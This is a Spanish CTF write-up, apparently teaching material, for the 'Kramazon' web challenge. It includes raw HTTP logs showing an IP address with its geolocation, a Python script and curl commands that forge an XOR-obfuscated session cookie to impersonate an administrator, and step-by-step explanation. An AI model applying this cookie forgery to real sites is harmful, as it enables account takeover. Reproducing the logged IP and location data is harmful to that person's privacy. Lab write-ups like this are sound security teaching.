User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Sat, 06 Dec 2025 01:48:28 GMT
Priority: u=0, i
Te: trailers


HTTP/2 304 Not Modified
Date: Sun, 07 Dec 2025 15:25:09 GMT
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Etag: W/"533c-19af1589e39"
Last-Modified: Sat, 06 Dec 2025 01:48:28 GMT
X-Powered-By: Express
Cf-Cache-Status: DYNAMIC
Server-Timing: cfCacheStatus;desc="DYNAMIC"
Server-Timing: cfEdge;dur=9,cfOrigin;dur=156
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=CYyZrCZdPaWRWaUMnoWhSYni2rMc8R49YftfN48OrTcl%2BP13Z%2FSBnIdoz4HipKa91k9aP8M8vjsvF8RSs1HSeVTEVl5YwRvffqB3qMN9Ggo%3D"}]}
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
Server: cloudflare
Cf-Ray: 9aa508b3ad041b45-LAX
Alt-Svc: h3=":443"; ma=86400


```

## d4

```
GET /json/ HTTP/1.1
Host: ipapi.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://kramazon.csd.lol/
Origin: https://kramazon.csd.lol
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
Te: trailers
Connection: keep-alive

HTTP/2 200 OK
Date: Sun, 07 Dec 2025 15:25:09 GMT
Content-Type: application/json
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
Server: cloudflare
Allow: POST, OPTIONS, OPTIONS, HEAD, GET
X-Frame-Options: DENY
Vary: Host, origin
Access-Control-Allow-Origin: https://kramazon.csd.lol
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.stripe.com https://*.paddle.com https://www.google.com https://www.gstatic.com https://maps.gstatic.com https://maps.googleapis.com https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; style-src 'self' 'unsafe-inline' https://*.paddle.com https://fonts.gstatic.com https://fonts.googleapis.com; img-src 'self' data: https://ipapi.co https://maps.gstatic.com https://maps.googleapis.com https://*.stripe.com; font-src 'self' data: https://fonts.gstatic.com https://fonts.googleapis.com; frame-src 'self' https://www.google.com https://*.stripe.com https://*.paddle.com https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/; connect-src 'self' https://ipapi.co/ https://*.paddle.com https://*.stripe.com https://maps.googleapis.com https://www.google.com/recaptcha/; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
Cf-Cache-Status: DYNAMIC
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=F5ajodnx0HyrXIj1gosGbLZBgxj%2B4toNIinf4sowjcXPiCtPZi3Yb9EfIc4A5t6cBGOkI9sOuTxpLpg3lE4UIjPoK3RG"}]}
Cf-Ray: 9aa508b77e5914da-LAX

{
    "ip": "177.227.66.90",
    "network": "177.227.64.0/20",
    "version": "IPv4",
    "city": "Morelia",
    "region": "Michoacán",
    "region_code": "MIC",
    "country": "MX",
    "country_name": "Mexico",
    "country_code": "MX",
    "country_code_iso3": "MEX",
    "country_capital": "Mexico City",
    "country_tld": ".mx",
    "continent_code": "NA",
    "in_eu": false,
    "postal": "58195",
    "latitude": 19.6745,
    "longitude": -101.2423,
    "timezone": "America/Mexico_City",
    "utc_offset": "-0600",
    "country_calling_code": "+52",
    "currency": "MXN",
    "currency_name": "Peso",
    "languages": "es-MX",
    "country_area": 1972550.0,
    "country_population": 126190788,
    "asn": "AS13999",
    "org": "Mega Cable, S.A. de C.V."
}
```


## Solve Final

```python
import requests
import base64
import json
import time

# --- CONFIGURACIÓN DEL OBJETIVO ---
BASE_URL = "https://kramazon.csd.lol"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Content-Type": "application/json"
}

def forge_cookie(user_id):
    """
    Falsifica la cookie de sesión explotando el cifrado XOR débil.
    
    Análisis de la vulnerabilidad:
    Se descubrió que la cookie 'auth' se genera haciendo XOR al ID del usuario
    con la clave 0x37 (55 en decimal) y luego codificando en Base64.
    Fuente: Función 'santaMagic' en script.js.
    """
    key = 0x37  # Clave mágica encontrada en el JS
    data = str(user_id)
    
    # Aplicar XOR carácter por carácter
    xored_bytes = b''.join([bytes([ord(c) ^ key]) for c in data])
    
    # Codificar a Base64 para obtener el valor final de la cookie
    encoded_cookie = base64.b64encode(xored_bytes).decode('utf-8')
    return encoded_cookie

def solve():
    print("--- INICIANDO EXPLOIT KRAMAZON ---")
    
    # PASO 1: Generar cookie administrativa
    # El objetivo es ser el Usuario 1 (Santa)
    target_user = 1
    admin_cookie = forge_cookie(target_user)
    cookies = {'auth': admin_cookie}
    
    print(f"[*] Identidad falsificada: Usuario {target_user}")
    print(f"[*] Cookie generada (XOR 0x37 + Base64): {admin_cookie}")

    # PASO 2: Crear la orden con privilegios elevados
    print(f"\n[*] Creando orden en {BASE_URL}/create-order...")
    try:
        r_create = requests.post(f"{BASE_URL}/create-order", json={}, headers=HEADERS, cookies=cookies)
        r_create.raise_for_status()
        
        data = r_create.json()
        order_id = data['order_id']
        callback_url = data['callback_url']
        print(f"[+] Orden creada exitosamente. ID: {order_id}")
        
    except Exception as e:
        print(f"[-] Error crítico al crear la orden: {e}")
        return

    # Esperamos brevemente para simular el procesamiento del backend
    time.sleep(1)

    # PASO 3: Finalizar la orden para obtener la ruta secreta
    # Al tener la cookie de Santa, el servidor nos devolverá la ruta del manifiesto.
    print(f"\n[*] Finalizando orden {order_id} como Usuario {target_user}...")
    
    finalize_payload = {
        "user": target_user,
        "order": order_id
    }
    
    r_final = requests.post(f"{BASE_URL}/finalize", json=finalize_payload, headers=HEADERS, cookies=cookies)
    response_json = r_final.json()
    
    if response_json.get("privileged") is True:
        print("[+] ¡ÉXITO! Privilegios de Santa confirmados.")
        manifest_route = response_json.get("internal_route")
        print(f"[*] Ruta del manifiesto revelada: {manifest_route}")
        
        # PASO 4: Descargar el Manifiesto y obtener la Flag
        print(f"\n[*] Descargando bandera desde: {manifest_route}")
        r_flag = requests.get(f"{BASE_URL}{manifest_route}", cookies=cookies)
        
        print("\n" + "="*40)
        print("CONTENIDO DEL MANIFIESTO (FLAG):")
        print("="*40)
        print(r_flag.text.strip())
        print("="*40)
    else:
        print("[-] Fallo: El servidor no reconoció los privilegios. Revisa la generación de la cookie.")
        print(f"Respuesta del servidor: {response_json}")

if __name__ == "__main__":
    solve()
```


## Solve explicada

# Kramazon: Write-up de Solución (CTF Web)

**Autor:** Carlos Oliva **Categoría:** Seguridad Web / Criptografía **Dificultad:** Media **Vulnerabilidades:** Criptografía Débil (XOR), Insecure Direct Object Reference (IDOR), Suplantación de Sesión.

---

## 1. Descripción del Escenario

El reto nos presenta "Kramazon", una tienda en línea operada por el sindicato KRAMPUS. La inteligencia sugiere que existe un fallo en el sistema de pagos que permite a usuarios normales obtener el estatus de "Envío Prioritario de Santa". El objetivo es explotar este fallo para obtener el _Manifiesto de Ruta Prioritaria_ donde se encuentra la bandera.

## 2. Reconocimiento (Recon)

Al analizar el código fuente de la página (`view-source:https://kramazon.csd.lol/`), encontramos referencias a un archivo `script.js` encargado de la lógica del frontend.

### Hallazgos Clave en `script.js`:

1. **Flujo de la Orden:** El usuario crea una orden (`/create-order`) y luego la finaliza (`/finalize`) enviando un JSON con el `user_id` y el `order_id`.
2. **Pista Criptográfica:** Existe una función no utilizada llamada `santaMagic`:
    
    JavaScript
    
    ```
    function santaMagic(n) {
        return n ^ 0x37; // TODO: remove in production
    }
    ```
    
    Esto sugiere que el sistema usa una operación **XOR** con la clave `0x37` (55 en decimal) para ofuscar o procesar datos.
    
3. **Objetivo:** El código verifica explícitamente si el usuario es el número **1**: `if (status.internal.user === 1) { ... alert("Welcome, Santa!...") }`.

## 3. Análisis de la Vulnerabilidad

Al interactuar con la aplicación, observamos que el servidor nos asigna una cookie de sesión llamada `auth`.

- **Usuario asignado:** `3921` (visto en los logs de respuesta).
- **Cookie recibida:** `BA4FBg==`.
### Ingeniería Inversa de la Cookie

Sospechamos que la cookie `auth` es simplemente el ID del usuario ofuscado usando la lógica `santaMagic`.

Procedemos a decodificar la cookie y compararla con el ID en texto plano:

1. **Decodificación Base64:**
    - Cookie: `BA4FBg==`
    - Valor Hexadecimal: `04 0E 05 06`
        
2. Análisis XOR (Texto Plano vs Cifrado):
    
    Comparamos el ID "3921" con los bytes hexadecimales usando la clave sospechosa 0x37.
    - Carácter `'3'` (Hex `0x33`) $\oplus$ `0x37` = `0x04` (Coincide con el 1er byte)
    - Carácter `'9'` (Hex `0x39`) $\oplus$ `0x37` = `0x0E` (Coincide con el 2do byte)
    - Carácter `'2'` (Hex `0x32`) $\oplus$ `0x37` = `0x05` (Coincide con el 3er byte)
    - Carácter `'1'` (Hex `0x31`) $\oplus$ `0x37` = `0x06` (Coincide con el 4to byte)
        
**Conclusión:** El mecanismo de sesión es inseguro. El servidor genera la cookie simplemente haciendo `XOR` al ID del usuario con `0x37` y codificando el resultado en Base64. No hay firma digital ni validación del lado del servidor.

## 4. Explotación (The Attack)

Para obtener la bandera, debemos suplantar al **Usuario 1** (Santa).

### Paso 1: Falsificación de Cookie (Forging)

Calculamos manualmente la cookie para el ID "1":

1. **Texto plano:** `'1'` (ASCII/Hex `0x31`).
    
2. **Operación XOR:** $0x31 \oplus 0x37 = 0x06$.
    
3. **Codificación Base64:** El byte `0x06` en Base64 es `Bg==`.
    

### Paso 2: Automatización del Ataque

Usamos un script en Python para inyectar esta cookie falsa, crear una orden y acceder al manifiesto restringido.


## Ahora con curl

### Paso 1: Crear la Orden (Inyectando la Cookie)

Enviamos una petición POST a `/create-order`. Usamos el flag `-b` para enviar nuestra cookie falsificada manualmente.

```
curl -X POST https://kramazon.csd.lol/create-order \
     -H "Content-Type: application/json" \
     -d "{}" \
     -b "auth=Bg=="
{"order_id":"8ef608e0","status":"pending","callback_url":"/status/queue/c7b585b430ccd33f.json"}
```

### Paso 2: Finalizar la Orden (Escalada de Privilegios)

Ahora confirmamos la orden. Aquí es donde el servidor verifica nuestra cookie `Bg==`, ve que corresponde al ID `1` (Santa) y nos autoriza.

_Reemplaza `TU_ORDER_ID` con el ID obtenido en el Paso 1._

```
 
     
curl -X POST https://kramazon.csd.lol/finalize \
     -H "Content-Type: application/json" \
     -b "auth=Bg==" \
     -d '{"user": 1, "order": "8ef608e0"}'
{"success":true,"privileged":true,"message":"Order finalized with Santa-level priority!","internal_route":"/priority/manifest/route-2025-SANTA.txt","flag_hint":"flag{npld_async_cookie_"
```

_El servidor nos revela la ruta secreta: `/priority/manifest/route-2025-SANTA.txt`_.

### Paso 3: Descargar la Bandera

Finalmente, hacemos un GET a la ruta del manifiesto. **Es crucial seguir enviando la cookie**, de lo contrario el servidor podría denegar el acceso al archivo.

```
curl -X GET https://kramazon.csd.lol/priority/manifest/route-2025-SANTA.txt \
     -b "auth=Bg=="
     
     
North Pole Logistics Directorate – PRIORITY ROUTE MANIFEST
-----------------------------------------------------------

FLAG:
csd{npld_async_callback_idor_mastery}
```

### Resumen para tus alumnos sobre los comandos:

- **`-X POST`**: Especifica el método HTTP.
- **`-H "Content-Type: application/json"`**: Le dice al servidor que estamos enviando datos JSON (necesario para que la API entienda el cuerpo del mensaje).
- **`-d '{"..."}'`**: Envía los datos (payload) de la petición.
- **`-b "auth=Bg=="`**: La parte más importante del ataque. Envía la cabecera `Cookie: auth=Bg==` sin necesidad de un navegador, suplantando la identidad de la sesión.

## Falsificacion con la cookie

Esta es una excelente oportunidad para explicar a tus alumnos un concepto fundamental en criptoanálisis: el **Ataque de Texto Plano Conocido** (Known-Plaintext Attack).

Para falsificar la cookie, no "adivinamos"; aplicamos ingeniería inversa basándonos en dos piezas de evidencia que teníamos: el código fuente y el tráfico de red.

Aquí tienes la explicación técnica detallada del procedimiento paso a paso.

### 1. El Algoritmo de "Cifrado"

Encontramos la lógica en el archivo `script.js`. Los desarrolladores implementaron una ofuscación simple (no es cifrado real) usando una operación **XOR** ($\oplus$):

$$\text{Cifrado}(n) = n \oplus \text{0x37}$$

Donde `0x37` (55 en decimal) es la **clave estática**.

### 2. Validación de la Hipótesis (Ingeniería Inversa)

Antes de atacar, verificamos si esta teoría era cierta usando tu propia cookie capturada en los logs.
- **Texto Plano (Tu Usuario):** `3921`
- **Texto Cifrado (Tu Cookie):** `BA4FBg==`
    

Desglosamos la cookie `BA4FBg==` para ver si coincidía con la operación XOR:

1. Decodificar Base64:
    Al decodificar BA4FBg==, obtenemos los bytes hexadecimales: 04 0E 05 06.
    
2. Comparación Byte a Byte:
    
    Tomamos cada carácter de tu ID 3921, buscamos su valor ASCII en Hexadecimal y aplicamos XOR con la clave 0x37:
    
| **Carácter ID** | **Valor Hex (ASCII)** | **Operación (XOR 0x37)** | **Resultado Esperado** | **Byte en Cookie** | **¿Coincide?** |
| --------------- | --------------------- | ------------------------ | ---------------------- | ------------------ | -------------- |
| **'3'**         | `0x33`                | `0x33` $\oplus$ `0x37`   | `0x04`                 | `04`               | ✅ Sí           |
| **'9'**         | `0x39`                | `0x39` $\oplus$ `0x37`   | `0x0E`                 | `0E`               | ✅ Sí           |
| **'2'**         | `0x32`                | `0x32` $\oplus$ `0x37`   | `0x05`                 | `05`               | ✅ Sí           |
| **'1'**         | `0x31`                | `0x31` $\oplus$ `0x37`   | `0x06`                 | `06`               | ✅ Sí           |
    
**Conclusión:** Confirmamos que el algoritmo para generar la cookie es: `Base64( ID_Usuario XOR 0x37 )`.

### 3. La Falsificación (The Forgery)

El objetivo es suplantar al **Usuario 1** (Santa). Ahora que conocemos el algoritmo ("la receta"), podemos cocinar nuestra propia cookie.

**Objetivo:** Cifrar el carácter `'1'`.

1. Obtener valor ASCII:
    El carácter '1' en la tabla ASCII es el valor hexadecimal 0x31 (decimal 49).
    
2. Aplicar la Operación XOR:
    $$\text{0x31} \oplus \text{0x37} = \text{0x06}$$
    
    _Explicación binaria para ingenieros:_
    Plaintext
    
    ```
    0011 0001  (Carácter '1')
    0011 0111  (Clave 0x37)
    ---------  (XOR)
    0000 0110  (Resultado 0x06)
    ```
    
3. Codificar en Base64:
    
    Tomamos el byte resultante 0x06 y lo codificamos en Base64.
    
    - En Python: `base64.b64encode(b'\x06')`
    - Resultado: **`Bg==`**
        
### Resumen para la Pizarra

Si vas a dibujar esto en el pizarrón para tu clase de seguridad, este es el flujo lógico:

1. **Entrada:** ID del objetivo (`"1"`).
2. **Proceso:** `XOR` con la clave hardcodeada (`55` o `0x37`).
3. **Codificación:** Convertir el resultado binario a `Base64` para transporte HTTP.
4. **Inyección:** Insertar `Cookie: auth=Bg==` en la cabecera HTTP.
    
El servidor recibe `Bg==`, lo decodifica, hace el XOR inverso (que es la misma operación) y obtiene el ID `1`, otorgándote permisos de administrador.